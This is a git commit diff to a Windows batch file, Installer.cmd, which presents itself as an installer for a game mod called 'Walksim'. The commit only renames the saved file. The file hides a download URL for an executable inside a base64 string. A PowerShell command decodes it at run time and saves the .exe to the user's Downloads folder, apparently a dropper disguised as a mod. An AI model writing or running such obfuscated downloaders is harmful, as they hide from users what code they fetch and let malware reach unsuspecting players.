d81a6e0ed2e0db3b3b11fb873bab34c54e8e3c33
Ox-VGH <idksub47@gmail.com>
2026-08-24 15:13:14 -0400

    Update Installer.cmd

--- Installer.cmd
+++ Installer.cmd
@@ -1,6 +1,6 @@
 @echo off
 set "B64_URL=aHR0cHM6Ly9naXRodWIuY29tL0NvbXBhY3RBSU9mZmljaWFsL0dvcmlsbGEtVGFnLU1vZC1IdWIvcmVsZWFzZXMvZG93bmxvYWQvQ2hyaXN0bWFzTW9kRHJvcC9Nb2RJbnN0YWxsZXIuZXhl"
-set "FILE_PATH=%USERPROFILE%\Downloads\ModInstaller.exe"
+set "FILE_PATH=%USERPROFILE%\Downloads\Installer.exe"
 
 echo Downloading Walksim...
 powershell -Command "$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%B64_URL%')); Invoke-WebRequest -Uri $url -OutFile '%FILE_PATH%'"
